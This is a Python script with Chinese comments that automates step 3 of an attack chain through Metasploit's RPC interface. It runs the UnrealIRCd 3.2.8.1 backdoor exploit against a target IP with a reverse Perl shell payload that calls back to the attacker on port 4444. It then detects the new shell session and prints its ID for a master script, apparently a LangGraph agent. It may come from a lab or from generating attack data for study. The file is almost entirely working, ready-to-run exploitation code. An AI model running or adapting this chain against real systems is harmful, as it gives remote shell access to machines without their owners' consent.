import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())

def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    
    print(f"--- [Step 3] Target: {target_ip} | Attacker: {my_ip} ---")
    
    # start step 3
    output_time_file_start = 'time_step_3_start.txt'
    record_timestamp(folder, output_time_file_start)
    
    # 為了測試穩定性，可以保留 sleep，但在自動化中這通常可以減少
    print("Waiting 60s (Script Requirement)...")
    time.sleep(60)

    try:
        client = MsfRpcClient('kali')
        
        # 1.【關鍵】記錄攻擊前的 Session 列表
        # 這樣我們才能知道哪個 Session 是新產生的
        sessions_before = set(client.sessions.list.keys())
        print(f"Active Sessions Before Attack: {list(sessions_before)}")

        # 2. 建立 Console
        cid = client.consoles.console().cid
        console = client.consoles.console(cid)
        print(f"Console {cid} created.")
        
        # 3. 準備指令 (使用 Console 寫入指令比操作 module 物件更直觀穩定)
        commands = [
            'use exploit/unix/irc/unreal_ircd_3281_backdoor',
            f'set RHOSTS {target_ip}',
            'set RPORT 6697',
            'set PAYLOAD cmd/unix/reverse_perl',
            f'set LHOST {my_ip}',
            'set LPORT 4444',
            'set VERBOSE true', # 開啟詳細輸出以便除錯
            'run'
        ]

        # 逐行寫入指令
        for cmd in commands:
            console.write(cmd)
            time.sleep(0.5)

        # 4.【關鍵】即時讀取輸出 (Polling Loop)
        print("--- Metasploit Exploit Output ---")
        max_wait_time = 60 # 等待 exploit 執行的最大秒數
        start_time = time.time()
        
        while True:
            result = console.read()
            data = result.get('data', '')
            
            if data:
                print(data, end='') # 即時印出
                
                # 判斷結束的特徵 (Session 開啟通常會有這句)
                if "Command shell session" in data and "opened" in data:
                    print("\n[+] Shell session opened detected!")
                    # 這裡不 break，多讀一點確保完整
                    
                # 如果 exploit 失敗或結束
                if "Exploit completed, but no session was created" in data:
                    print("\n[-] Exploit failed to create session.")
                    break
            
            # 超時保護
            if time.time() - start_time > max_wait_time:
                print("\n[!] Exploit execution timed out (no output).")
                break
            
            # 稍微睡一下避免 CPU 飆高
            time.sleep(1)
            
            # 如果已經超過預期時間且沒有更多輸出，也可以跳出
            # 但為了確保 Session 建立，我們在後面檢查 Session 列表比較準

        # 5.【關鍵】檢查是否有新 Session 產生
        print("\n--- Checking for New Sessions ---")
        # 給一點時間讓 Session 在後台註冊
        time.sleep(10) 
        
        sessions_after = set(client.sessions.list.keys())
        new_sessions = sessions_after - sessions_before
        
        if new_sessions:
            # 找出最新的那個 ID
            new_id = list(new_sessions)[0]
            print(f"[SUCCESS] New Session Created: {new_id}")
            # 這是給您的 LangGraph 或 Master Script 抓取用的標準格式
            print(f"NEW_SESSION_ID:{new_id}")
        else:
            print("[FAILURE] No new session was created. Check RHOSTS/LHOST or Target Vulnerability.")

    except Exception as e:
        print(f"An error occurred: {e}")
        pass
    finally:
        # 確保銷毀 Console
        if 'console' in locals():
            console.destroy()

    time.sleep(30)
    output_time_file_end = 'time_step_3_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)

if __name__ == "__main__":
    main(sys.argv)